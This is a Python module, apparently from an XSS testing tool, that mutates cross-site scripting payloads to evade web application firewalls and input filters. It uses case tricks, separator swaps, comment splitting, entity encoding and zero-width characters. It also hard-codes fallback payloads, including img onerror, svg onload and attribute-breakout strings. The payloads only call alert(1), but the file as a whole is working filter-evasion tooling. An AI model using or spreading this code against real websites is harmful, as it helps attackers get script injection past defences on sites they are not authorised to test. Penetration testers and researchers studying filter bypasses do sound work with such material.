"""Payload mutation for filter/WAF evasion (pure)."""

from __future__ import annotations

import re
from typing import Iterable, List, Set

from intellixss.models import FilterType


def apply_mutations(payload: str, filters: Iterable[FilterType] | None = None) -> List[str]:
    """Generate mutated variants of a base payload."""
    filters = list(filters or [])
    out: List[str] = [payload]
    out.append(case_variation(payload))
    out.append(tab_bypass(payload))
    out.append(slash_bypass(payload))
    out.append(comment_injection(payload))
    out.append(whitespace_bypass(payload))
    out.append(html_entity_event(payload))
    out.append(backtick_call(payload))

    if any(f.value.startswith("waf_") for f in filters) or FilterType.STRIP_SCRIPT in filters:
        out.append(null_byte_soft(payload))
        out.append(mixed_case_tags(payload))

    if FilterType.STRIP_SCRIPT in filters or FilterType.STRIP_TAGS in filters:
        # prefer non-script alternatives derived from payload intent
        out.extend(
            [
                "<img src=x onerror=alert(1)>",
                "<svg/onload=alert(1)>",
                "<details open ontoggle=alert(1)>",
            ]
        )

    if FilterType.HTML_ENCODE in filters or FilterType.BLOCK_ANGLE in filters:
        # attribute breakouts without requiring new tags if already in attr context
        out.extend(
            [
                '"onmouseover="alert(1)',
                "'onmouseover='alert(1)",
                '" autofocus onfocus="alert(1)',
                "javascript:alert(1)",
            ]
        )

    return _dedupe(out)


def mutate_for_waf(payloads: List[str], filters: List[FilterType], limit: int = 60) -> List[str]:
    """Expand a payload list with WAF-oriented mutations, prioritized."""
    expanded: List[str] = []
    for p in payloads:
        expanded.extend(apply_mutations(p, filters))
    # Prefer shorter / less noisy first for labs
    expanded.sort(key=lambda s: (0 if "svg" in s.lower() or "img" in s.lower() else 1, len(s)))
    return _dedupe(expanded)[:limit]


# JS builtins / protocols that MUST stay lowercase to execute in browsers
_PRESERVE_TOKENS = ("alert", "prompt", "confirm", "javascript", "eval", "onerror", "onload", "onfocus", "onmouseover")


def case_variation(payload: str) -> str:
    """
    Alternate tag/letter case for WAF bypass, but keep executable JS identifiers
    and event names lowercase so payloads still run under browser confirmation.
    """
    # Protect tokens with placeholders
    protected = payload
    mapping = {}
    for i, tok in enumerate(_PRESERVE_TOKENS):
        # case-insensitive replace of token occurrences with placeholder
        def _sub(m, _i=i, _t=tok):
            key = f"__PX{_i}__"
            mapping[key] = m.group(0)  # preserve original casing if already mixed? force lower
            return key

        protected = re.sub(re.escape(tok), _sub, protected, flags=re.I)

    result = []
    upper = True
    for ch in protected:
        if ch.isalpha():
            result.append(ch.upper() if upper else ch.lower())
            upper = not upper
        else:
            result.append(ch)
    out = "".join(result)
    for key, _ in mapping.items():
        # Always restore lowercase executable form
        tok_i = int(key.replace("__PX", "").replace("__", ""))
        out = out.replace(key, _PRESERVE_TOKENS[tok_i])
        # placeholders may have been case-mangled
        out = re.sub(re.escape(key), _PRESERVE_TOKENS[tok_i], out, flags=re.I)
    # Safety: force critical tokens lowercase
    for tok in _PRESERVE_TOKENS:
        out = re.sub(re.escape(tok), tok, out, flags=re.I)
    return out


def tab_bypass(payload: str) -> str:
    return re.sub(r"(<[a-zA-Z][^>]*?) ([a-zA-Z])", lambda m: m.group(0).replace(" ", "\t", 1), payload)


def slash_bypass(payload: str) -> str:
    return re.sub(r"<([a-zA-Z]+) ", r"<\1/", payload, count=1)


def comment_injection(payload: str) -> str:
    return (
        payload.replace("script", "scr<!---->ipt")
        .replace("alert", "ale<!---->rt")
        .replace("onerror", "one<!---->rror")
    )


def whitespace_bypass(payload: str) -> str:
    return payload.replace(" ", "\n", 1) if " " in payload else payload


def html_entity_event(payload: str) -> str:
    return payload.replace("alert", "&#97;&#108;&#101;&#114;&#116;")


def backtick_call(payload: str) -> str:
    return payload.replace("alert(1)", "alert`1`").replace("alert('XSS')", "alert`XSS`")


def null_byte_soft(payload: str) -> str:
    # Soft form: zero-width / uncommon separator rather than raw NUL which breaks URLs
    return payload.replace("onerror", "onerror\u200b").replace("script", "scr\u200bipt")


def mixed_case_tags(payload: str) -> str:
    for tag in ("script", "img", "svg", "details"):
        if tag in payload.lower():
            mixed = "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(tag))
            payload = re.sub(tag, mixed, payload, count=1, flags=re.I)
    return payload


def filter_by_char_survival(
    payloads: List[str],
    blocked: Set[str],
    encoded: Set[str],
    min_keep: int = 5,
) -> List[str]:
    """Drop payloads that require known-blocked characters (unless encoded bypass)."""
    problem = blocked | encoded
    if not problem:
        return payloads
    kept: List[str] = []
    for p in payloads:
        if "&#" in p or "%3c" in p.lower() or "fromCharCode" in p:
            kept.append(p)
            continue
        if ("<" in problem or ">" in problem) and ("<" in p or ">" in p):
            # keep event-only attribute breakouts without new tags if they don't need <>
            if not (p.startswith('"') or p.startswith("'") or p.startswith("javascript:")):
                continue
        kept.append(p)
    if len(kept) < min_keep:
        return payloads[:min_keep]
    return kept


def _dedupe(items: List[str]) -> List[str]:
    seen: Set[str] = set()
    out: List[str] = []
    for i in items:
        if i and i not in seen:
            seen.add(i)
            out.append(i)
    return out
